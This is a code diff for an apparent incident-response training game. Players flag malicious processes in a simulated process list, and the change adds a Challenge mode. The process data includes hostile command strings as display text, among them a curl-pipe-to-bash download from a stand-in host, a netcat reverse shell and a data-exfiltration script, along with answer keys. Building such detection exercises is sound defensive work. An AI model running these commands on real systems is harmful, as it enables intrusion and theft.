@@ -6,40 +6,30 @@ import {
 } from 'lucide-react';
 import { ACTIONS } from '../gameState';
 
-const PROCESSES = [
-  { pid: 1,    user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: '/sbin/init splash',                                                          suspicious: false },
-  { pid: 245,  user: 'root',     cpu: '0.0',  mem: '0.2',  cmd: 'kworker/u4:2',                                                              suspicious: false },
-  { pid: 831,  user: 'syslog',   cpu: '0.0',  mem: '0.1',  cmd: 'rsyslogd -n -iNONE',                                                        suspicious: false },
-  { pid: 1120, user: 'root',     cpu: '0.1',  mem: '0.2',  cmd: '/usr/sbin/sshd -D',                                                         suspicious: false },
-  { pid: 2241, user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: '/usr/sbin/cron -f',                                                         suspicious: false },
-  { pid: 3105, user: 'www-data', cpu: '0.8',  mem: '2.1',  cmd: 'nginx: worker process',                                                    suspicious: false },
-  { pid: 3811, user: 'mysql',    cpu: '1.2',  mem: '8.4',  cmd: 'mysqld --user=mysql --datadir=/var/lib/mysql',                              suspicious: false },
-  { pid: 4191, user: 'root',     cpu: '0.1',  mem: '0.4',  cmd: '/usr/bin/python3 /opt/monitoring/cloudwatch_agent.py',                      suspicious: false },
-  {
-    pid: 4812, user: 'www-data', cpu: '89.2', mem: '15.3',
-    cmd: 'python3 /tmp/.x/data_exfil.py --target 185.220.101.47:4444',
-    suspicious: true,
-    reason: 'Hidden /tmp/.x directory. Target arg matches active C2 socket. 89% CPU is consistent with bulk data exfiltration in progress.',
-  },
-  { pid: 5523, user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: 'ps aux',                                                                    suspicious: false },
-  { pid: 6677, user: 'nobody',   cpu: '0.2',  mem: '0.5',  cmd: '/usr/sbin/apache2 -k start',                                               suspicious: false },
-  {
-    pid: 7834, user: 'root',     cpu: '0.2',  mem: '0.4',
-    cmd: 'sshd: root@pts/1 [priv]',
-    suspicious: true,
-    reason: 'Interactive root SSH session. No corresponding legitimate login in /var/log/auth.log. Likely the attacker\'s persistent access channel into the machine.',
-  },
-  { pid: 8001, user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: '-bash',                                                                     suspicious: false },
-  {
-    pid: 9344, user: 'www-data', cpu: '3.4',  mem: '1.2',
-    cmd: '/bin/sh -i',
-    suspicious: true,
-    reason: 'Interactive shell (-i flag) spawned under www-data context with no terminal assignment. Classic indicator of a web shell or reverse shell — the initial intrusion vector.',
-  },
-  { pid: 9901, user: 'root',     cpu: '0.1',  mem: '0.3',  cmd: '/usr/lib/snapd/snapd',                                                      suspicious: false },
+const PROCESSES_FINAL = [
+  { pid: 1,    user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: '/sbin/init splash' },
+  { pid: 245,  user: 'root',     cpu: '0.0',  mem: '0.2',  cmd: 'kworker/u4:2' },
+  { pid: 1120, user: 'root',     cpu: '0.1',  mem: '0.2',  cmd: '/usr/sbin/sshd -D' },
+  { pid: 3105, user: 'www-data', cpu: '0.8',  mem: '2.1',  cmd: 'nginx: worker process' },
+  { pid: 4812, user: 'www-data', cpu: '89.2', mem: '15.3', cmd: 'python3 /tmp/.x/data_exfil.py --target 185.220.101.47:4444' },
+  { pid: 7834, user: 'root',     cpu: '0.2',  mem: '0.4',  cmd: 'sshd: root@pts/1 [priv]' },
+  { pid: 9344, user: 'www-data', cpu: '3.4',  mem: '1.2',  cmd: '/bin/sh -i' },
+  { pid: 9901, user: 'root',     cpu: '0.1',  mem: '0.3',  cmd: '/usr/lib/snapd/snapd' },
 ];
 
-const CORRECT_PIDS = new Set([4812, 7834, 9344]);
+const CORRECT_PIDS_FINAL = new Set([4812, 7834, 9344]);
+
+const PROCESSES_CHALLENGE = [
+  { pid: 1,    user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: '/sbin/init' },
+  { pid: 1120, user: 'root',     cpu: '0.1',  mem: '0.2',  cmd: '/usr/sbin/sshd -D' },
+  { pid: 3105, user: 'www-data', cpu: '0.8',  mem: '2.1',  cmd: 'apache2 -k start' },
+  { pid: 4880, user: 'www-data', cpu: '92.1', mem: '12.0', cmd: 'curl http://bad-actor.io/malware.sh | bash' },
+  { pid: 7990, user: 'root',     cpu: '0.2',  mem: '0.4',  cmd: 'sshd: attacker@pts/1' },
+  { pid: 9400, user: 'www-data', cpu: '5.4',  mem: '1.2',  cmd: 'nc -e /bin/bash 199.199.199.199 4444' },
+  { pid: 9901, user: 'root',     cpu: '0.1',  mem: '0.3',  cmd: 'cron' },
+];
+
+const CORRECT_PIDS_CHALLENGE = new Set([4880, 7990, 9400]);
 
 const HINTS = [
   'Look at CPU usage — normal background services rarely exceed 5%. Cross-reference with the active network sockets shown in the VM card above.',
@@ -54,6 +44,9 @@ export default function Phase1Triage({ state, dispatch, addToast }) {
   const [selectedPids, setSelectedPids] = useState(new Set());
   const [processResult, setProcessResult] = useState(null);
   const hintsUsed = state.hintsUsed?.p1 || 0;
+
+  const processes = state.gameMode === 'Challenge' ? PROCESSES_CHALLENGE : PROCESSES_FINAL;
+  const correctPids = state.gameMode === 'Challenge' ? CORRECT_PIDS_CHALLENGE : CORRECT_PIDS_FINAL;
 
   const handleUseHint = () => {
     if (hintsUsed >= 3) return;
@@ -128,15 +121,15 @@ export default function Phase1Triage({ state, dispatch, addToast }) {
   };
 
   const handleAnalyzeProcesses = () => {
-    const allCorrect = [...CORRECT_PIDS].every(p => selectedPids.has(p));
-    const noFalsePos = [...selectedPids].every(p => CORRECT_PIDS.has(p));
+    const allCorrect = [...correctPids].every(p => selectedPids.has(p));
+    const noFalsePos = [...selectedPids].every(p => correctPids.has(p));
     if (allCorrect && noFalsePos) {
       setProcessResult('correct');
       dispatch({ type: ACTIONS.IDENTIFY_PROCESSES });
       addToast({ type: 'success', title: 'Process Analysis Complete', message: 'All 3 malicious processes correctly identified. Memory acquisition scope established.' });
     } else {
-      const falsePos = [...selectedPids].filter(p => !CORRECT_PIDS.has(p));
-      const missed = [...CORRECT_PIDS].filter(p => !selectedPids.has(p));
+      const falsePos = [...selectedPids].filter(p => !correctPids.has(p));
+      const missed = [...correctPids].filter(p => !selectedPids.has(p));
       let penalty, note;
       if (falsePos.length > 0) {
         penalty = 15;
@@ -265,10 +258,21 @@ export default function Phase1Triage({ state, dispatch, addToast }) {
                 <Network size={13} /> Active Network Sockets (ss/netstat map)
               </div>
               <div className="font-mono text-xs space-y-0.5">
-                <div style={{ color: '#ef4444' }}>tcp ESTAB 0 0  10.0.4.22:4444   185.220.101.47:59382  users:(("python3",pid=4812,fd=3))</div>
-                <div style={{ color: '#ef4444' }}>tcp ESTAB 0 0  10.0.4.22:22     185.220.101.47:11933  users:(("sshd",pid=7834,fd=4))</div>
-                <div style={{ color: '#475569' }}>tcp LISTEN 0 128 0.0.0.0:80      *:*                   users:(("nginx",pid=3105,fd=6))</div>
-                <div style={{ color: '#475569' }}>tcp LISTEN 0 128 0.0.0.0:443     *:*                   users:(("nginx",pid=3105,fd=8))</div>
+                {state.gameMode === 'Challenge' ? (
+                  <>
+                    <div style={{ color: '#ef4444' }}>tcp ESTAB 0 0  10.0.4.22:4444   199.199.199.199:59382  users:(("nc",pid=9400,fd=3))</div>
+                    <div style={{ color: '#ef4444' }}>tcp ESTAB 0 0  10.0.4.22:22     199.199.199.199:11933  users:(("sshd",pid=7990,fd=4))</div>
+                    <div style={{ color: '#475569' }}>tcp LISTEN 0 128 0.0.0.0:80      *:*                   users:(("apache2",pid=3105,fd=6))</div>
+                    <div style={{ color: '#475569' }}>tcp LISTEN 0 128 0.0.0.0:443     *:*                   users:(("apache2",pid=3105,fd=8))</div>
+                  </>
+                ) : (
+                  <>
+                    <div style={{ color: '#ef4444' }}>tcp ESTAB 0 0  10.0.4.22:4444   185.220.101.47:59382  users:(("python3",pid=4812,fd=3))</div>
+                    <div style={{ color: '#ef4444' }}>tcp ESTAB 0 0  10.0.4.22:22     185.220.101.47:11933  users:(("sshd",pid=7834,fd=4))</div>
+                    <div style={{ color: '#475569' }}>tcp LISTEN 0 128 0.0.0.0:80      *:*                   users:(("nginx",pid=3105,fd=6))</div>
+                    <div style={{ color: '#475569' }}>tcp LISTEN 0 128 0.0.0.0:443     *:*                   users:(("nginx",pid=3105,fd=8))</div>
+                  </>
+                )}
               </div>
             </div>
 
@@ -390,7 +394,7 @@ export default function Phase1Triage({ state, dispatch, addToast }) {
                   ))}
                 </div>
                 <div style={{ maxHeight: 320, overflowY: 'auto' }}>
-                  {PROCESSES.map(proc => {
+                  {processes.map(proc => {
                     const isSel = selectedPids.has(proc.pid);
                     const cpuHigh = parseFloat(proc.cpu) > 5;
                     return (
